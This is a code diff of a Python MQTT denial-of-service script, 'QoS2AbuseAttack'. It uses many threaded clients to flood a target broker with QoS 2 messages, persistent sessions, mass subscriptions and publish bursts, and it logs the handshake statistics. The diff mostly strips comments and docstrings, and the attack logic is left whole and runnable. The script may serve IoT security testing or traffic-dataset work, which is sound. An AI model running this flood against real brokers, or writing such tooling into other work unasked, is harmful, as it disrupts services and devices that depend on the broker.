@@ -1,5 +1,3 @@
-"""MQTT QoS 2 Abuse Attack - exploits QoS 2 (exactly once) delivery mechanism to overload broker."""
-
 import argparse
 import csv
 import json
@@ -10,7 +8,6 @@ import time
 from datetime import datetime, timezone
 
 import paho.mqtt.client as mqtt
-
 
 class QoS2AbuseAttack:
     def __init__(self, args):
@@ -25,7 +22,6 @@ class QoS2AbuseAttack:
         self.pubcomp_received = 0
         self.qos2_handshake_failures = 0
         
-        # Track QoS 2 message states
         self.pending_qos2_messages = {}
         self.qos2_lock = threading.Lock()
 
@@ -60,19 +56,17 @@ class QoS2AbuseAttack:
             ])
 
     def generate_qos2_payload(self, size_kb=1):
-        """Generate payload for QoS 2 messages"""
         if self.args.payload_type == "random":
             size_bytes = size_kb * 1024
             payload = {
                 "timestamp": datetime.now().isoformat(),
                 "qos": 2,
                 "data": ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") 
-                               for _ in range(size_bytes - 200))  # Account for JSON overhead
+                               for _ in range(size_bytes - 200))
             }
         elif self.args.payload_type == "binary":
             payload = bytes([random.randint(0, 255) for _ in range(size_kb * 1024)])
         else:
-            # Structured IoT-like payload
             payload = {
                 "device_id": f"device_{random.randint(1, 1000):04d}",
                 "timestamp": datetime.now().isoformat(),
@@ -94,15 +88,13 @@ class QoS2AbuseAttack:
         return json.dumps(payload) if isinstance(payload, dict) else payload
 
     def qos2_flood_worker(self, worker_id):
-        """Worker that floods broker with QoS 2 messages"""
         client_id = f"{self.args.client_prefix}_flood_{worker_id:03d}"
-        client = mqtt.Client(client_id=client_id, clean_session=False)  # Persistent session for QoS 2
+        client = mqtt.Client(client_id=client_id, clean_session=False)
         
         if self.args.username:
             client.username_pw_set(self.args.username, self.args.password)
         
-        # QoS 2 message tracking
-        message_states = {}  # mid -> state info
+        message_states = {}
         
         def on_connect(client, userdata, flags, rc):
             if rc == 0:
@@ -113,7 +105,6 @@ class QoS2AbuseAttack:
                 self.log_qos2_event(client_id, worker_id, 0, "", "connect", status="failed", details=f"rc={rc}")
         
         def on_publish(client, userdata, mid):
-            # QoS 2 publish initiated - waiting for PUBREC
             with self.qos2_lock:
                 self.messages_published += 1
                 message_states[mid] = {"state": "PUBLISH_SENT", "timestamp": time.time()}
@@ -134,9 +125,7 @@ class QoS2AbuseAttack:
                               qos=msg.qos, payload_size=len(msg.payload), status="received", 
                               details=f"payload_preview={payload_preview[:50]}")
         
-        # Set up QoS 2 handshake callbacks
         def on_pubrec(client, userdata, mid):
-            # PUBREC received - sending PUBREL
             with self.qos2_lock:
                 self.pubrec_received += 1
                 if mid in message_states:
@@ -147,7 +136,6 @@ class QoS2AbuseAttack:
                               handshake_step="PUBREC", status="received", details="sending_pubrel")
         
         def on_pubcomp(client, userdata, mid):
-            # PUBCOMP received - QoS 2 handshake complete
             with self.qos2_lock:
                 self.pubcomp_received += 1
                 if mid in message_states:
@@ -166,11 +154,9 @@ class QoS2AbuseAttack:
         client.on_subscribe = on_subscribe
         client.on_message = on_message
         
-        # Set QoS 2 specific callbacks
         client.on_pubrec = on_pubrec
         client.on_pubcomp = on_pubcomp
         
-        # Connect to broker
         connected = False
         while not connected and not self.stop_event.is_set():
             try:
@@ -184,11 +170,9 @@ class QoS2AbuseAttack:
         if not connected:
             return
         
-        # Subscribe to response topics (QoS 2)
         response_topic = f"qos2/response/{worker_id}/+"
         client.subscribe(response_topic, qos=2)
         
-        # QoS 2 message publishing loop
         message_interval = 1.0 / self.args.message_rate if self.args.message_rate > 0 else 1.0
         message_count = 0
         
@@ -230,7 +214,6 @@ class QoS2AbuseAttack:
         except KeyboardInterrupt:
             pass
         finally:
-            # Clean shutdown
             try:
                 client.loop_stop()
                 client.disconnect()
@@ -239,7 +222,6 @@ class QoS2AbuseAttack:
                 pass
 
     def qos2_subscription_abuse(self, worker_id):
-        """Worker that abuses QoS 2 subscriptions"""
         client_id = f"{self.args.client_prefix}_sub_{worker_id:03d}"
         client = mqtt.Client(client_id=client_id, clean_session=False)
         
@@ -248,7 +230,6 @@ class QoS2AbuseAttack:
         
         def on_connect(client, userdata, flags, rc):
             if rc == 0:
-                # Subscribe to many topics with QoS 2
                 subscription_topics = [
                     "qos2/+/data",
                     "qos2/+/telemetry",
@@ -270,7 +251,6 @@ class QoS2AbuseAttack:
             with self.qos2_lock:
                 self.messages_received += 1
             
-            # Process QoS 2 message (triggers PUBREC/PUBREL/PUBCOMP handshake)
             payload_size = len(msg.payload)
             self.log_qos2_event(client_id, worker_id, 0, msg.topic, "qos2_message_received", 
                               qos=msg.qos, payload_size=payload_size, status="processing")
@@ -278,12 +258,10 @@ class QoS2AbuseAttack:
         client.on_connect = on_connect
         client.on_message = on_message
         
-        # Connect and maintain subscription
         try:
             client.connect(self.args.broker, self.args.port, self.args.keepalive)
             client.loop_start()
             
-            # Keep subscription active
             while not self.stop_event.is_set():
                 time.sleep(5)
                 print(f"[Worker {worker_id}] QoS 2 subscription active, received: {self.messages_received}")
@@ -298,19 +276,16 @@ class QoS2AbuseAttack:
                 pass
 
     def qos2_mixed_abuse(self, worker_id):
-        """Mixed QoS 2 abuse - publishing and subscribing"""
         client_id = f"{self.args.client_prefix}_mixed_{worker_id:03d}"
         client = mqtt.Client(client_id=client_id, clean_session=False)
         
         if self.args.username:
             client.username_pw_set(self.args.username, self.args.password)
         
-        # Track handshake timing
         handshake_times = []
         
         def on_connect(client, userdata, flags, rc):
             if rc == 0:
-                # Mixed subscriptions
                 mixed_topics = [f"mixed/{worker_id}/topic_{i}" for i in range(10)]
                 for topic in mixed_topics:
                     client.subscribe(topic, qos=2)
@@ -322,7 +297,6 @@ class QoS2AbuseAttack:
             handshake_times.append({"mid": mid, "pubrec_time": time.time()})
         
         def on_pubcomp(client, userdata, mid):
-            # Find corresponding PUBREC time
             for hs in handshake_times:
                 if hs["mid"] == mid:
                     handshake_duration = time.time() - hs["pubrec_time"]
@@ -340,10 +314,8 @@ class QoS2AbuseAttack:
             client.connect(self.args.broker, self.args.port, self.args.keepalive)
             client.loop_start()
             
-            # Mixed publishing pattern
             message_count = 0
             while not self.stop_event.is_set() and message_count < self.args.max_messages_per_worker // 2:
-                # Burst publishing
                 for i in range(5):
                     topic = f"mixed/{worker_id}/burst_{message_count}_{i}"
                     payload = self.generate_qos2_payload(random.randint(1, 5))
@@ -351,7 +323,7 @@ class QoS2AbuseAttack:
                     time.sleep(0.1)
                 
                 message_count += 5
-                time.sleep(random.uniform(1, 3))  # Pause between bursts
+                time.sleep(random.uniform(1, 3))
         
         except Exception as e:
             print(f"[Worker {worker_id}] Mixed worker exception: {e}")
@@ -363,7 +335,6 @@ class QoS2AbuseAttack:
                 pass
 
     def attack_worker(self, worker_id):
-        """Main attack worker dispatcher"""
         attack_type = worker_id % 3
         
         try:
@@ -378,24 +349,21 @@ class QoS2AbuseAttack:
             print(f"[Worker {worker_id}] Worker exception: {e}")
 
     def run(self):
-        """Start the QoS 2 abuse attack"""
         print(f"Starting QoS 2 Abuse attack with {self.args.workers} workers")
         print(f"Target: {self.args.broker}:{self.args.port}")
         print(f"Message rate: {self.args.message_rate} msgs/sec per worker")
         print(f"Payload size: {self.args.payload_size_kb} KB")
         print(f"Max messages per worker: {self.args.max_messages_per_worker}")
         
-        # Start worker threads
         threads = []
         for i in range(self.args.workers):
             thread = threading.Thread(target=self.attack_worker, args=(i,))
             thread.daemon = True
             thread.start()
             threads.append(thread)
-            time.sleep(0.2)  # Stagger worker starts
+            time.sleep(0.2)
         
         try:
-            # Statistics reporting loop
             while True:
                 time.sleep(10)
                 with self.qos2_lock:
@@ -415,7 +383,6 @@ class QoS2AbuseAttack:
             print("\nStopping QoS 2 abuse attack...")
             self.stop_event.set()
             
-            # Wait for threads to finish
             for thread in threads:
                 thread.join(timeout=15)
             
@@ -426,7 +393,6 @@ class QoS2AbuseAttack:
             print(f"  PUBREC received: {self.pubrec_received}")
             print(f"  PUBCOMP received: {self.pubcomp_received}")
             print(f"  Handshake failures: {self.qos2_handshake_failures}")
-
 
 def main():
     parser = argparse.ArgumentParser(description="MQTT QoS 2 Abuse Attack")
@@ -461,7 +427,6 @@ def main():
         attack.run()
     finally:
         attack.close()
-
 
 if __name__ == "__main__":
     main()
